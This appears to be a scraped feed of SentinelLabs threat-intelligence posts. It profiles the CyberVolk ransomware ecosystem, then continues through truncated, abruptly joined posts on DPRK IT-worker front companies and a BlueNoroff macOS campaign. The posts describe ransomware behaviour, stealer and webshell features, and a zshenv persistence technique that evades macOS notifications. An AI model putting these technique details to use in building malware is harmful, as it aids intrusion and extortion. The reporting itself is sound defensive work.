Between June and October 2024, CyberVolk claimed responsibility for multiple ransomware attacks.\nThe main objective of CyberVolk and related groups is to leverage geopolitical issues to launch and justify attacks on public and government entities, primarily in the service of Russian government interests.\nSentinelLabs has observed a shared codebase used by CyberVolk, AzzaSec and DoubleFace’s ransomware. Additionally, CyberVolk has promoted other ransomware families like HexaLocker and Parano. These groups and the tools they leverage are all closely intertwined.\nThese hacktivist groups are extremely dynamic and volatile. In-fighting, threats, and inflated political-posturing are common, leading to fragmentation and the rapid re-shaping of the hacktivist threat landscape.\nIntroduction\nCyberVolk is a politically motivated hacktivist collective which launched its own RaaS in June 2024. The group uses both DDoS and ransomware attacks in its efforts to undermine and disrupt the operations of those opposed to Russian interests.\nThe group has become an increasingly prominent player within the cybercrime ecosystem, adopting and repurposing existing commodity malware to advance its causes. Highly-skilled actors within the collective expand and revise such tools, effectively making them more sophisticated as they move through various hands.\nThe CyberVolk collective is a prime example of how readily threat actors can access and deploy dangerous ransomware builders such as AzzaSec, Diamond, LockBit, Chaos and others. This adaptability makes the group highly dynamic and increasingly challenging to track.\nIn this post, we provide an overview of a number of ransomware families within the context of CyberVolk’s operations, breaking down the increasingly blurred lines between tools and group affiliations. Understanding the shifting nature of dynamic hacktivist collectives like CyberVolk can help organizations prepare and fortify their defenses.\nThe Origins of CyberVolk Ransomware\nCyberVolk is a pro-India/pro-Russia “hacktivist” group that has been actively targeting entities in multiple countries. In its current form, it emerged during May 2024. Prior to this, the group was known by a few different names, including GLORIAMIST, GLORIAMIST India and Solntsevskaya Bratva. CyberVolk exploits current geopolitical issues, focused on launching and justifying its attacks on public and government entities.\n\nWhile the group claims alliances with other broad groups such as LAPSUS$, Anonymous, and the Moroccan Dragons, it has also been associated with NONAME057(16) and other RU-friendly, DDoS-focused, groups. However, CyberVolk has also embraced ransomware as a tool to further its cause, with self-branded ransomware payloads as well as alliances with associated ransomware families, namely Doubleface, HexaLocker, and the Parano family.\nCyberVolk’s branded ransomware is derived from the AzzaSec (aka AzzaSecurity) ransomware code. AzzaSec is a pro-Russia, anti-Israel, and anti-Ukraine hacktivist group that emerged in February of 2024. It has claimed alliances with some of the same groups linked to CyberVolk such as NONAME057(16). Initially conducting DDoS and defacement attacks, the group later expanded into extortion and ransomware.\nJune 2024 Release of AzzaSec Ransomware\nIn June, the source-code for “AzzaSec Ransom” was leaked and subsequently adopted and adapted by multiple groups aligned with AzzaSec’s mission. Prior to its disbandment in August of 2024, AzzaSec operated under a ransomware-as-a-service (RaaS) model and pushed out multiple iterations of its Windows-centric ransomware.\nAzzaSec “disbandment” announcement, August 2024\nPost-AzzaSec | The Rise of CyberVolk’s RaaS Operations\nThe CyberVolk-branded RaaS was announced in late June 2024.\nCyberVolk Ransomware Announcement, June 2024\nThe CyberVolk-modified ransomware’s development is credited to @ghostdoor_maldev and is based on the earlier AzzaSec Ransomware code. The Windows-specific payloads are written in C++. Upon execution, the payloads drop bitmap images (files with extension .bmp) into %temp% folder, and display them, prior to any encryption occurring. The ransomware will terminate any running processes belonging to either Microsoft Management Console (MMC) or Task Manager.\nCyberVolk Ransomware MMC processes and Task Manager Termination\nEarly versions of CyberVolk Ransomware used the AES algorithm for file encryption and the SHA512 algorithm for key generation. This was later updated to “ChaCha20-Poly1305 + AES + RSA + Quantum resistant algorithms” according to posts on the group’s Telegram.\nCyberVolk wallpaper with countdown timer\nThe payment screen used by CyberVolk Ransomware displays the decryption timer along with payment details. CyberVolk ransomware supports BTC and USDT payments. Across all the functional samples we analyzed, the timeout value was set to 5 hours, with the ransom amount set to $1000.00 (equivalent in BTC or USDT). A ransom note named CyberVolk_Readme.txt containing the same contact details presented in the wallpaper and payment screens is also dropped to disk. Telegram contact details are provided as well.\nCyberVolk ransom note\nThe .CyberVolk extension is added to affected files:\nCyberVolk-encrypted files\nThe decryption timer is controlled via a time.dat file written to %appdata%\\Roaming directory. The timeout is set to 5 hours in CyberVolk samples analyzed by SentinelOne. This functionality is mirrored in the Invisible Ransom payloads as well, as they are based on the same codebase (AzzaSec Ransom).\nDecryption timer in CyberVolk\nThe time.dat file stores the defined timeout value in seconds. Default builds of Invisible Ransom (or CyberVolk) will write time.dat with a value of 17967 seconds (roughly 5 hours).\nCyberVolk has continued to utilize their branded ransomware payloads, more recently in attacks against entities in Japan, and hype up these attacks across their various channels (e.g., Telegram, X, Discord). These campaigns were part of “#OpJP” which extended through October. Victims of “#OpJP” include:\nThe Japan Foundation\nJapan Oceanographic Data Center (JODC)\nThe Japan Meteorological Agency (JMA)\nTokyo Global Information System Centre\nCyberVolk and #OpJP (Targeting Japan)\nCyberVolk Associates | Invisible/Doubleface Team Ransomware\nInvisible or Doubleface ransomware is associated with “Doubleface Team” (aka Double Alliance). This group emerged in August-September 2024 as a convergence of associates within CyberVolk, Doubleface, and Moroccan Black Cyber Army. CyberVolk began promoting Doubleface on September 22, 2024.\nSeptember 22 DoubleAlliance / CyberVolk posting\nInvisible/Doubleface ransomware payloads function in an identical manner to CyberVolk-branded ransomware samples. This includes duplication of the 5-hour timeout setting and active wallpaper modification used for input of the decryption key and displaying payment details. Both ransomware families are derived from the same AzzaSec Ransomware code base.\nInvisible/Doubleface ransomware wallpaper\nInvisible/Doubleface Source\nThe source code/builder for Invisible has been leaked publicly and distributed through various channels, mainly Telegram. As stated previously, both Invisible and CyberVolk’s payloads as of this writing are based on the same code, observed in AzzaSec Ransomware.\nInvisible Ransom source files\nThe archive contains the full Visual Studio project and source code for building new Invisible Ransom payloads, along with some already compiled samples/stubs.\nThe file ransom.cpp contains the main logic for the ransomware payload. It contains all the global variables including ransomware note template data, orchestrates all the encryption tasks, and handles any process termination or manipulation. The main ransom.cpp handles calls out to Cryptographic.cpp to process encryption tasks, including the implementation of AES/RSA (via aes.cpp and rsa.cpp respectively).\nSimilar to earlier AzzaSec ransomware examples, these payloads encrypt files via AES, then manage encryption keys and wrapping via RSA. The current implementation indicates AES-256 for file encryption, and RSA-2048 for wrapping the keys. Each file is encrypted via AES-256 (EncFile function in Cryptographic.cpp) with the AES key then encrypted via RSA-2048.\nEncrypting files in Invisible Ransom\nWe can also see the implementation of the ransom countdown mechanism in ransom.cpp. As with CyberVolk Ransom, the default timeout period is 5 hours. This is initially set via the timeLeft variable in ransom.cpp\nThe timer writes a time.dat file to %appdata%\\Roaming as we saw with CyberVolk. The 5 hour time limit for these samples is read from this path. In theory, this file could be manipulated to alter the timeout.\nTimer code in Invisible Ransom, referencing time.dat\nThe ransom.cpp source file also contains the template for the ransom notes, which are written to the same path from which the ransomware is executed as InvisibleReadMe.txt.\nInvisible Ransom’s ransom note template in “ransom.cpp”\nThe termination of MMC processes and Task Manager is also present in the Invisible Ransom source (as we also see with CyberVolk samples)\n“Lock. Demand. Dominate” | HexaLocker Ransomware\nHexaLocker is a ransomware family that first appeared in July 2024. HexaLocker is closely associated with LAPSUS$, reportedly having been originally developed by “ZZART3XX”, a proclaimed former associate of the group. HexaLocker payloads are written in Golang. As of this writing, we have only observed payloads targeting Windows systems.\nOn July 22, CyberVolk first referenced HexaLocker via one of Holy League’s posts. The Holy League is a loosely affiliated group of 70+ members born out of protest against Spain and associated arrests of members of NONAME057(16). HexaLocker’s posts and branding are all laden with their “Lock. Demand. Dominate” slogan.\nIn September 2024, HexaLocker launched a new Telegram channel after previous ones had been banned or removed. The updated channel contains details on their ongoing existence along with screenshots of the current HexaLocker panel.\nHexaLocker Telegram message\nThroughout October 2024, CyberVolk’s communication channels continued to echo messaging from HexaLocker. This includes HexaLocker’s solicitations for help in continuing to progress with HexaLocker. On October 2, 2024, HexaLocker posted an update asking for help but also teasing new features in the pipeline. These include:\nStronger anti-debug/anti-analysis features\nAdvanced obfuscations (crypting/packing)\nInclusion of EDR/XDR/AV-Killer\nPermanent AMSI bypass\nImproved process-injection\nRemote Thread Hijacking\nUAC Bypass improvements\nSelf-deletion\nInteresting developments continued with HexaLocker throughout October 2024. On October 4th, the group posted an update with a video demo claiming that an “EDR Killer” and AMSI/WD Bypass features had been added. This was followed on October 6th with an update stating that UAC bypasses had been added to the product.\nOn October 20, 2024, the actor behind the HexaLocker Telegram channel (ZZART3XX) posted their intention to officially leave and denounce LAPSUS$ as well as any peripheral affiliations. This includes the maintenance of the HexaLocker project and all the relationships and alliances that revolve around it.\nIn this announcement, the author also indicated that they would be offering HexaLocker source code, including its web panel, along with “LAPSUS$ Ransomware” source for sale.\nHexaLocker “shut down” posting via Telegram\nThis was followed the next day on October 21 with offers to sell HexaLocker and the panel infrastructure, along with associated “LAPSUS$ Ransomware”. These messages were echoed across HexaLocker, Holy League, and LAPSUS$-aligned channels.\nThe overt promotion of HexaLocker within CyberVolk channels has ceased since the HexaLocker shutdown announcement.\nParano Ransomware Within the CyberVolk Collective\nIn late October 2024, various identities in the CyberVolk community began promoting the release of Parano Ransomware v1. This appears to be another affiliation for the CyberVolk collective.\nOctober 2024 Parano Ransomware Announcement by CyberVolk\nAccording to the announcement, Parano Ransomware comes with a $400.00 USD price tag per single payload/stub. The ransomware features strong anti-analysis and anti-debugging features, and uses a combination of AES-128 and RSA-4096 for key management. \nThe Parano malware family extends beyond ransomware, also including “Parano Checker” and “Parano Stealer”, a commodity, Python-based, infostealer. The malware attempts to gather and exfiltrate browser data, Discord details, crypto wallet information and keys, along with other related software and system diagnostic details. The data can be exfiltrated via Discord webhook to a channel or location of the attacker’s choosing.\nParano Stealer Announcement, October 2024\nParano Checker is a reconnaissance and info-gathering tool capable of navigating targets and helping to isolate interesting ingress points or data repositories, or assist with dictionary/brute force attacks on certain interfaces (e.g., CPanel and WordPress login panels).\nAt the time of writing, we have not observed the executable variations of Parano (aka Paraodeus Ransomware) in the wild. The author has shared a non-malicious Python-based demo of a “ScreenLocker”. As it stands, the nature of the relationship between CyberVolk and the Parano ecosystem is still evolving.\nBeyond Ransomware | CyberVolk Stealers and Webshells\nIn addition to ransomware and other disruptive attacks, CyberVolk develops and distributes infostealer malware and webshells. The group announced the new webshell in late October 2024.\nCyberVolk Webshell announcement (Telegram)\nThe CyberVolk webshell is distributed as a standard PHP file with the actual malicious code base64-encoded inside its body.\nCyberVolk Webshell decoded\nThe publicly released version of the CyberVolk webshell provides multiple functions. The current version of the webshell allows for files to be uploaded, renamed, and downloaded. Further, attackers can traverse directories on the target server and gather environmental details.\n“CyberVolk Stealer” is distributed in the form of a Python script and is based on LBX-Grabber, an existing Python information stealer, which is in turn built into BLX-Stealer. Specifically, CyberVolk is derived from the LBX-Grabber component.\nCyberVolk Stealer Python Script\nCyberVolk Stealer attempts to gather various types of data from the system, then exfiltrates the data via Discord. Version 1 of the stealer was announced in September 2024. Core features include robust gathering of browser, discord, game and crypto wallet data. The stealer targets multiple browsers and numerous wallets.\nCyberVolk Stealer identifying sensitive data\nTelegram Exit and Weaponized Bans\nIn early November 2024, CyberVolk, and numerous affiliated groups, vanished from Telegram as a result of a mass ban of hacktivist groups. The last significant posts to the CyberVolk Telegram channels were on November 3, 2024.\nThe group subsequently announced, via Twitter/X, that it would only be using the X platform going forward. The Twitter/X account for DoubleFace, @DoubleFace_Team, made a similar announcement around the same time.\nTelegram ban updates on X\nTelegram channels belonging to CyberVolk and numerous allies appear to have been banned maliciously. We have observed specific actors claiming responsibility for attempting to close and/or extort channels belonging to AzzaSec and DoubleFace amongst others.\nIn September, some users began threatening to have rival hacktivist group channels including CyberVolk, APTZone, Doubleface, AzzaSec and others banned.\nSeptember 14, 2024 – “Matteo” targeting CyberVolk/APTZone with bans\nOn November 16, 2024, RipperSec posted their ‘perspective’ on the banning of multiple hacktivist channels, indicating that some prior members of AzzaSec and Doubleface were attempting to exhort other channels under the threat of a Telegram ban.\nNovember 13, 2024 RipperSec Telegram Post\nThis was highlighted in another post on November 13, 2024 in the “Hunt3r Kill3rs” Telegram channel. In this post, an actor referring to AzzaSec claimed “they didn’t close nobody’s channels, all the channels got closed by me”. The post went on to advise others receiving extortion threats to ignore them. “I’m the only one that is closing the hacktivist community’s channels and groups”, the actor claimed.\nNovember 13, 2024 posting in Hunt3r Kill3rs Telegram Channel\nThis weaponization of the Telegram Terms-of-Service is increasing in parallel with threat actor groups moving off Telegram to seek more clandestine and secure communication channels in response to increased scrutiny and declining trust in the platform after the arrest of Telegram founder Pavel Durov.\nConclusion\nThe number of ransomware families associated with the CyberVolk hacktivist group highlights the ability of this group to rapidly pivot, building upon existing tools to suit their needs and further their causes. Though primarily composed of lower-skilled threat actors that reach for and use whatever works for them, we continue to see how quickly the group is able to move and adapt.\nThe reuse of tools like AzzaSec Ransom, Diamond RW, and even more established ones like LockBit and Chaos, demonstrates just how dynamic these affiliations and alliances between hacktivist groups can be. Not only are such groups touting new tools within short time frames only to abandon them and pivot to something else later, the number of hacktivist groups is also growing. Infighting and tensions amongst them are also fuel for the rates of growth and change – as alliances crumble or shift, the threat environment stays highly volatile and dynamic, making it more difficult for cyber defenders to track their activities consistently.\nAs groups like CyberVolk leverage openly-available commodity tools with high potential for causing damage, they continue to add more layers of complexity, expanding and revising the tools as they are passed around within the collective. Ransomware operations will only get muddier and increase how much cybersecurity teams will need to monitor in order to stay up to date on the happenings within the cybercrime ecosystem.\nIndicators of Compromise\nCyberVolk\nAzzaSec\nInvisible / Doubleface Team\nHexaLocker\nPDBs \n\r\nC:/Users/zzart/Desktop/HexaLocker RaaS/crypter.go\r\nC:/Users/zzart/Desktop/MalwareDeveloppement/HexaLocker RaaS/decrypt_key.go\r\nC:/Users/zzart/Desktop/MalwareDeveloppement/HexaLocker RaaS/crypterV1.go\r\n\nDNS\nLAPSUS$/HexaLocker\nParano\n3ce26f45f5da58ab75b4d1cecc78c3bbe275f708 | Stealer (archive)\n4581b30e6f5946a570963cd76dc79beaa8bcf1c3 | ScreenLocker\n91abb7fadf847f3810bbe0734e3c31d5dc7bce6d | ScreenLocker\nb5d8e690a75f07e7d3e18fcc5b86bfe2362a3300 | ScreenLocker","enclosure":{"url":"https://www.sentinelone.com/wp-content/uploads/2024/11/cybervolk_v2-ftr.jpg","length":"900294","type":"image/jpeg"},"dc:creator":"Jim Walter","content":"A loose collective of mostly low-skilled actors, CyberVolk absorbs and adapts a wide array of destructive malware for use against political targets.","contentSnippet":"A loose collective of mostly low-skilled actors, CyberVolk absorbs and adapts a wide array of destructive malware for use against political targets.","guid":"https://www.sentinelone.com/?post_type=labs&p=108943","categories":["Hacktivism"],"isoDate":"2024-11-25T10:55:10.000Z","tag":"intel"},{"creator":"Tom Hegel &amp; Dakota Cary","title":"DPRK IT Workers | A Network of Active Front Companies and Their Links to China","link":"https://www.sentinelone.com/labs/dprk-it-workers-a-network-of-active-front-companies-and-their-links-to-china/","pubDate":"Thu, 21 Nov 2024 10:55:47 +0000","content:encoded":"<h2>Executive Summary</h2>\n<ul>\n<li aria-level=\"1\">SentinelLabs has identified unique characteristics of multiple websites, now seized by the US Government, associated with the DPRK IT Worker front companies.</li>\n<li aria-level=\"1\">We assess with high confidence that DPRK actors seek to impersonate US based software and technology consulting businesses by copying the online brands of legitimate organizations, seeking to use these for financial objectives.</li>\n<li aria-level=\"1\">SentinelLabs has linked the activity to several active front companies and links these with high confidence to a larger set of organizations being created in China.</li>\n<li aria-level=\"1\">Our findings link additional companies, which remain active today, to the DPRK IT Workers scheme.</li>\n</ul>\n<h2>Background</h2>\n<p>North Korea operates a global network of IT workers, both as individuals and under front companies, to evade sanctions and generate revenue for the regime.

These workers are highly skilled in areas like software development, mobile applications, blockchain, and cryptocurrency technologies. By posing as professionals from other countries using fake identities and forged credentials, they secure remote jobs and freelance contracts with businesses worldwide.\nOur PinnacleOne team has compiled an executive summary of this threat, available here.\nFront companies, often based in China, Russia, Southeast Asia, and Africa, play a key role in masking the workers’ true origins and managing payments. Notable examples include China-based Yanbian Silverstar Network Technology Co. Ltd., disrupted in October 2023, and Russia-based Volasys Silver Star, sanctioned by the U.S. Department of the Treasury in 2018, for their roles in facilitating fraudulent IT operations. These entities helped DPRK workers launder earnings through online payment services and Chinese bank accounts. The payments, often routed through cryptocurrencies or shadow banking systems, ultimately support state programs, including weapons development, circumventing international sanctions.\nThese schemes present significant risks to employers, including potential legal violations, reputational damage, and insider threats such as intellectual property theft or malware implantation. Addressing these risks requires heightened awareness and stringent vetting processes to limit North Korea’s ability to exploit global tech markets.\nThis blog explores four newly identified examples of DPRK IT Worker front companies, analyzing their online presence and the methods they use to appear legitimate to unsuspecting targets in recent months. These four companies’ websites were recently subject to law enforcement action and taken offline.\nIndependent Lab LLC\nThe Independent Lab LLC website, inditechlab[.]com was active since at least February 2024, with indication it was acquired and operated using InterServer hosting since May 2022 (174.138.181[.]198). The domain itself was registered through NameCheap.\nThe content of the website is in line with what you would expect of a legitimate software development outsourcing business, with no obvious major indicators associated with the DPRK, or even illegitimate in any way. In the case of Independent Lab LLC, the website format and content was copied from Kitrum, a legitimate custom software firm headquartered in the United States. The DPRK actors did not retain the “We Stand with Ukraine” link or menu header.\nDPRK IT Worker Front Company Website – Independent Lab LLChot\nLegitimate business, source of copied website design used by DPRK\nThe content of the website centered around the Contact Us form, enticing visitors to engage in communications, providing no contact details on the website itself.\nShenyang Tonywang Technology LTD\nThe name “Shenyang Tonywang Technology” was used in the formal content of the website; however, the domain itself is tonywangtech[.]com. The website first became active in November 2023, overlapping with previously used InterServer hosting infrastructure (174.138.181[.]198), and was also registered via NameCheap.\nSimilar to the previous example, Shenyang Tonywang Technology advertises itself as a top software consulting company with bespoke solutions, including DevOps & cloud consulting. In this case, the website format and content was copied from Urolime, a legitimate DevOps consulting company headquartered in the United States.\nDPRK IT Worker Front Company Website – Shenyang Tonywang Technology LTD\nLegitimate Urolime business, source of copied website design used by DPRK\nTony WKJ LLC\nTony WKJ LLC IT Services website, wkjllc[.]com, was active since at least May 2024, with indication it was acquired and operated using InterServer hosting (174.138.181[.]198) since May 2022. The domain itself was registered through NameCheap.\nTony WKJ LLC advertises itself as a leading software development company that specializes in Agile IT development. Once again, In this case the website format and content was copied from a legitimate business. Specifically, this website is a copy from  ArohaTech IT Services, a software and web development company headquartered in Noida, India.\nHowever, a comparison to the legitimate website reveals that the DPRK actors have not only placed their own name, and removed original ArohaTech logos, they have also modified the content to clearly attempt to brand Tony WKJ LLC as a US based company.\nDPRK IT Worker Front Company Website – Tony WKJ LLC\nLegitimate business, source of copied website design used by DPRK\nHopanaTech\nHopanaTech website, hopanatech[.]com is a bit more unique from the others above. The domain itself was first registered in November 2020, and began hosting publicly via Asia Web Services Ltd (180.235.135[.]177) in December 2020. The website has been presented as shown below since at least the end of 2021. The domain was registered through NameCheap.\nThe website content aligns with the previous examples, including the description of being a custom software development company. The HopanaTech version of the content has been modified significantly; however, it continued to make use of customer reviews and marketing content from legitimate public websites. However, in some cases, content that would have required more than a simple text edit remains unchanged, showing the original sources name, such as the legitimate ITechArt firm’s website.\nDPRK IT Worker Front Company Website – HopanaTech\nDPRK IT Worker Front Company Website – HopanaTech – Showing content source\nUnited States Government Response\nEach of the above four companies has been disrupted by US Government agencies, specifically the Department of Justice, Federal Bureau of Investigation, Homeland Security Investigations, Defense Criminal Investigative Service, and the United States Postal Inspection Service.\nOn October 10th, the US Government seized the four domains belonging to the front companies, each of which now shows the standard takedown alert and links to the 2022 US Treasury fact sheet on DPRKs IT Worker scheme. The websites rotate between English and Korean language versions.\nDomain Seized Alert – English\nDomain Seized Alert – Korean\nExpanded Analysis\nDrawing on details from the four companies disrupted by US Government agencies, SentinelLabs was able to find multiple leads to an active network of DPRK IT front companies originating in China.\nThe Mysterious A1 Building\nIn an early 2024 archived snapshot of Shenyang Tonywang Technology’s website, tonywangtech[.]com, we can see the actor added the following address:\nNo. 1006-25, Building A1, No. 11, Tawan Street, Huanggu District, Shenyang City Liaoning 110036\ntonywangtech[.]com listed address and contact detailsWe identified an additional company with similar traits. First, the address happens to be highly close in proximity – listed next to each other on the same floor of the same building. No. 1006-23, Building A1, No. 11, Tawan Street, Huanggu, Shenyang, Liaoning, China\nThe additional company is Shenyang Huguo Technology Ltd, which uses the domain huguotechltd[.]com in a similar way to the previous four. The website uses copied content and logos from the legitimate Indian software firm TatvaSoft.\nActive DPRK linked company website -Shenyang Huguo Technology Ltd\nThe huguotechltd[.]com domain was registered in October 2023 via NameCheap. The domain has since been and continues to be hosted at 103.15.29[.]44, of Asia Web Services Ltd.\nWe assess Shenyang Huguo Technology Ltd. is closely associated with the previously four reviewed DPRK IT Worker front companies, and had remained online long enough to have been used to achieve the DPRKs objectives.\nThe Tony Wang Link\nHopanaTech’s website, hopanatech[.]com, listed three contacts before it was taken down by law enforcement. The first person, Wang Kejia, is listed with the email address “Tonywkj”.\nContacts from the now-seized HopanaTech website\nThe “wkj” is almost certainly the acronym for the preceding Chinese name, Wang Kejia. The Tonywkj@Hopana email address establishes a link between Wang Kejia, a real person who is a resident of the address in New Jersey and the “Tony Wang” identity. The Shenyang Tonywang Technology Company website discussed above was also subject to law enforcement action, and its name bears resemblance to the same Tongwkj listed by Hopana. Furthermore, the Tonywkj email also directly matches the domain of another taken-down DPRK IT Worker site discussed above, Tony WKJ LLC.\nThe Tong Yuze Identity\nLaw enforcement action established that Hopana Tech and Hopanatech[.]com are DRPK IT Worker Front companies. This analysis expands on the Hopana Tech company corporate registration data inside China.\nA corporate records website from the PRC indicates the Beijing Xiwang Technology Company (北京市戏网科技有限公司), previously used the name Beijing Hou Pa Na Technology Company (北京后帕纳科技有限公司), a clear cognate for the English-translated “HopanaTech.”\nCorporate record showing Xiwang’s previous use of the Hopana Technology name\nFurthermore, the above screenshot of HopanaTech’s website, which lists the Tonywkj email address, also lists Tong Yuze (佟雨泽). The same name is used for the corporate registrant of Beijing Xiwang Technology Company.Highlighted text shows that Beijing Xiwang Technology was previously known as Hopana Tech.\nContacts from the now-seized HopanaTech website\nAs if to allay concerns that Beijing Xiwang Technology Company was not a front company, corporate records show the firm only pays unemployment insurance, health insurance, and employee injury liability insurance for one person.\nCorporate records for Bejing Xiwang Technology Company\nTong Yuze is currently listed as the corporate registrant of 25 companies in China, including many restaurants and catering companies. Owing to increased data protection measures by the PRC, a complete accounting of Tong Yuze’s companies is not possible.\nSome companies identified as Tong Yuze’s include:\n海口宜路畅佟科技贸易有限公司\n北京上日清新食品有限公司\n京山味诚（北京）餐饮管理有限公司\n泽日启程（北京）餐饮管理有限公司\n北京哈巴萨科贸有限公司\nThis foray into restaurants does not appear to be a case of mistaken identity.

In April 2023, <a href=\"https://www.jamf.com/blog/bluenoroff-apt-targets-macos-rustbucket-malware/\" target=\"_blank\" rel=\"noopener noreferrer\">researchers</a> detailed an APT campaign targeting macOS users with multi-stage malware that culminated in a Rust backdoor capable of downloading and executing further malware on infected devices. ‘RustBucket’, as they labeled it, was attributed with strong confidence to the BlueNoroff APT. In May 2023, ESET researchers discovered a second RustBucket variant targeting macOS users, followed by Elastic’s <a href=\"https://www.elastic.co/security-labs/DPRK-strikes-using-a-new-variant-of-rustbucket\" target=\"_blank\" rel=\"noopener noreferrer\">discovery</a> in July that year of a third variant that included a LaunchAgent for persistence. In November 2023, Elastic also <a href=\"https://www.elastic.co/security-labs/elastic-catches-dprk-passing-out-kandykorn\" target=\"_blank\" rel=\"noopener noreferrer\">reported</a> on another DPRK campaign targeting blockchain engineers of a crypto exchange platform with KandyKorn malware. Further analysis by SentinelLabs was able to <a href=\"https://www.sentinelone.com/blog/dprk-crypto-theft-macos-rustbucket-droppers-pivot-to-deliver-kandykorn-payloads/\" target=\"_blank\" rel=\"noopener noreferrer\">connect</a> the KandyKorn and RustBucket campaigns.</p>\n<p>In early September 2024, the FBI began <a href=\"https://www.ic3.gov/PSA/2024/PSA240903\" target=\"_blank\" rel=\"noopener noreferrer\">warning</a> that North Korea was conducting “highly tailored, difficult-to-detect social engineering campaigns against employees of decentralized finance (&#8220;DeFi&#8221;), cryptocurrency, and similar businesses to deploy malware and steal company cryptocurrency”. Researchers from <a href=\"https://www.jamf.com/blog/jamf-threat-labs-observes-targeted-attacks-amid-fbi-warnings/\" target=\"_blank\" rel=\"noopener noreferrer\">Jamf</a> subsequently followed up on this report a few weeks later detailing an attack attempt that deployed malware masquerading as a Visual Studio updater.</p>\n<p>In October 2024, SentinelLabs observed a phishing attempt on a crypto-related industry that delivered a dropper application and a payload bearing many of the hallmarks of these previous attacks. We believe the campaign likely began as early as July 2024 and uses email and PDF lures with fake news headlines or stories about crypto-related topics. We dubbed this campaign ‘Hidden Risk’ and detail its operation and indicators of compromise below, including the use of a novel persistence mechanism abusing the zshenv configuration file.</p>\n<h2>Infection Vector</h2>\n<p>Initial infection is achieved via phishing email containing a link to a malicious application. The application is disguised as a link to a PDF document relating to a cryptocurrency topic such as “Hidden Risk Behind New Surge of Bitcoin Price”, “Altcoin Season 2.0-The Hidden Gems to Watch” and “New Era for Stablecoins and DeFi, CeFi”.</p>\n<p>The emails hijack the name of a real person in an unrelated industry as a sender and purport to be forwarding a message from a well-known crypto social media influencer. In the case of the ‘Hidden Risk’ pdf, the threat actors copied a <a href=\"https://ijsra.net/sites/default/files/IJSRA-2024-1296.pdf\" target=\"_blank\" rel=\"noopener noreferrer\">genuine research paper</a> entitled ‘Bitcoin ETF: Opportunities and risk’ by an academic associated with the University of Texas and hosted online by the International Journal of Science and Research Archive (IJSRA).</p>\n<figure id=\"attachment_108341\" aria-describedby=\"caption-attachment-108341\" style=\"width: 1789px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-108341\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_4.jpg\" alt=\"The fake PDF displayed to targets (left) and the original source document hosted online (right)\" width=\"1789\" height=\"614\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_4.jpg 1789w, https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_4-300x103.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_4-1024x351.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_4-768x264.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_4-1536x527.jpg 1536w\" sizes=\"auto, (max-width: 1789px) 100vw, 1789px\" /><figcaption id=\"caption-attachment-108341\" class=\"wp-caption-text\">The fake PDF displayed to targets (left) and the original source document hosted online (right)</figcaption></figure>\n<p>Unlike earlier campaigns attributed to BlueNoroff, the Hidden Risk campaign uses an unsophisticated phishing email that does not engage the recipient with contextually-relevant content, such as reference to personal or work-related information.</p>\n<p>Also of note is that the sender domain in our observed incident, <code>kalpadvisory[.]com</code>, has been <a href=\"https://www.reddit.com/r/IndianStockMarket/comments/1c3rema/incessant_spam_calls_from_kalp_advisory_and_others/\" target=\"_blank\" rel=\"noopener noreferrer\">noted</a> for spamming among online communities involved in the Indian stock market.</p>\n<figure id=\"attachment_108336\" aria-describedby=\"caption-attachment-108336\" style=\"width: 1574px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-108336\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_9.jpg\" alt=\"Social media users complain about spam calls from Kalp Advisory\" width=\"1574\" height=\"1024\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_9.jpg 1574w, https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_9-300x195.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_9-1024x666.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_9-768x500.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_9-1536x999.jpg 1536w\" sizes=\"auto, (max-width: 1574px) 100vw, 1574px\" /><figcaption id=\"caption-attachment-108336\" class=\"wp-caption-text\">Social media users complain about spam calls from Kalp Advisory</figcaption></figure>\n<p>The ‘open’ link in the phishing email hides a URL to another domain, <code>delphidigital[.]org</code>.

At the user level, it sits as a hidden file in the Home directory, <code>~/.zshenv</code>. A system wide version can also be located at <code>/etc/zshenv</code>. If it exists, the file is sourced for all Zsh sessions, including interactive and non-interactive shells, non-login shells and scripts. It is also read before all other Zsh startup files.</p>\n<p>Interestingly, previous malware samples used by the same threat actor have referenced <a href=\"https://www.jamf.com/blog/jamf-threat-labs-observes-targeted-attacks-amid-fbi-warnings/\" target=\"_blank\" rel=\"noopener noreferrer\">zsh_env</a> in their naming convention, but not actually used the mechanism. In an <a href=\"https://www.jamf.com/blog/jamf-threat-labs-observes-targeted-attacks-amid-fbi-warnings/\" target=\"_blank\" rel=\"noopener noreferrer\">earlier campaign</a>, BlueNoroff used the <code>~/.zshrc</code> config file to achieve persistence. However, this is a less reliable form of persistence since the file is only sourced when a user launches an interactive Terminal session or subsession from an existing console.</p>\n<p>Infecting the host with a malicious Zshenv file allows for a more powerful form of persistence. While this technique is not unknown, it is the first time we have observed it used in the wild by malware authors. It has particular value on modern versions of macOS since Apple <a href=\"https://www.sentinelone.com/blog/apples-macos-ventura-7-new-security-changes-to-be-aware-of/\" target=\"_blank\" rel=\"noopener noreferrer\">introduced user notifications</a> for background Login Items as of macOS 13 Ventura. Apple’s notification aims to warn users when a persistence method is installed, particularly oft-abused LaunchAgents and LaunchDaemons. Abusing Zshenv, however, does not trigger such a notification in current versions of macOS.</p>\n<p>In the binary, installation of the persistence mechanism is handled by the <code>sym.install_char__char_</code> function. The mechanism checks for a hidden touch file (zero byte) in the <code>/tmp/</code> folder called <code>.zsh_init_success</code>. If the file does not exist, then the &#8216;growth&#8217; binary is called and the touch file is created.</p>\n<figure id=\"attachment_108343\" aria-describedby=\"caption-attachment-108343\" style=\"width: 1195px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-108343\" 